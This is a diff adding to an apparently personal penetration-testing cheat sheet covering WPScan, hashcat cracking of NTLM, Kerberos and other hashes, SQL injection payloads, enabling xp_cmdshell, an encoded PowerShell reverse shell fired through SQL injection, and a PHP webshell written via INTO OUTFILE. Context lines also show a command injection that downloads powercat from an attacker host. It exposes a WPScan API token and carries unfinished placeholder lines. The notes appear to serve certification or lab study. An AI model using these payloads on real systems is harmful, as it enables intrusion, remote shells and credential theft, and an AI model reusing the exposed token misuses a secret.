@@ -96,6 +96,7 @@
      `curl http://<IP>/sitemap.xml`  
    - Vulnerabilities   
      `nikto -h http://<IP>`  
+     `wpscan --url http://alvida-eatery.org --api-token Cnwa5qbii36TyV5oHvnXnQObqC1CQAkJdPsaf5T8i0c` [API token](https://wpscan.com/api/)   
 1. Vulnerability detection
    - Identify unpatched services (E.g: SMB, RDP, Apache, MySQL)
    - Check for default/weak credentials
@@ -144,6 +145,28 @@
 - Hash identify: [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/)
 - Hash identify: [hashcat example](https://hashcat.net/wiki/doku.php?id=example_hashes)
 - Hash tracker: [CrackStation](https://crackstation.net/)
+- Base64 encoded: `b2Zmc2VjMTIzIQ==`  
+- common hash types
+  `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+  `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+  `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+  `kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+  - Linux
+    - md5crypt ($1$) -m 500 `$1$28772684$iEwNOgGugqO9.bIz5sk8k/`  
+    - phpass / WordPress ($P$) -m 400 `$P$984478476IagS59wHZvyQMArzfx58u.`
+    - OpenSSH Private Key ($sshng$6$) -m 22921 `$sshng$6$8$7620048997557487....`
+  - Windows
+    - **NTLM -m 3000** `b4b9b02e6f09a9bd760f388b67351e2b`
+    - **LM -m 3000** `299bd128c1101fd6`
+    - NetNTLMv2 -m 5600 `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c78303100000`
+    - Kerberos 5 AS-REP (etype 23) ($krb5asrep) -m 18200 `$krb5asrep$23$user@domain.com:3e156ada591263b8aa`  
+    - Kerberos 5 TGS-REP (etype 23) ($krb5tgs) -m 13100 `$krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31d0`
+  - Application
+    - **MD5 -m 0** `8743b52063cd84097a65d1633f5c74f5` (32 hex)
+    - **SHA-1 -m 100** `b89eaac7e61417341b710b727768294d0e6a277b` (40 hex)
+  - DB
+    - KeePass -m 13400 ($keepass$*1) `$keepass$*1*50000*0*375756b9e6c72891a8e5645a3338b8c`
+    - Atlassian (PBKDF2-HMAC-SHA1) -m 12001 `{PKCS5S2}NzIyNzM0NzY3NTIwNjI3MdDDis7wPxSbSzfFqDGf7u/L00kSEnupbz36XCL0m7wa`
   
 # Web application attack  
 - **Cross-site scripting**
@@ -299,6 +322,35 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
        `Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell`  > send encoding payload  
        `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`  
 - **SQL injection attacks**
+  - connect DB  
+    MYSQL: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`  
+    MSSQL: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`  
+  - simple payloads
+    - error
+      `' OR 1=1 --`  
+      `' or 1=1 in (select @@version) -- //`  
+    - union based  
+      `' UNION SELECT null, username, password, description, null FROM users -- //`  
+    - booloan
+      `offsec' AND 1=1 -- //`
+    - time-based
+      `offsec' AND IF (1=1, sleep(3),'false') -- //`
+  - xp_cmdshell
+    ```
+    impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+    EXECUTE sp_configure 'show advanced options', 1;
+    RECONFIGURE;
+    EXECUTE sp_configure 'xp_cmdshell', 1;
+    RECONFIGURE;
+    EXECUTE xp_cmdshell 'whoami';  
+    ```
+  - Blind reverse shell
+    `'; EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='; --`
+  - upload a PHP Backdoor from SQL
+    `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
+    `192xxx/tmp/webshell.php?cmd=id`  
+  - ddd
+  - ddd
   
 # Reverse shell
 - Kali listener
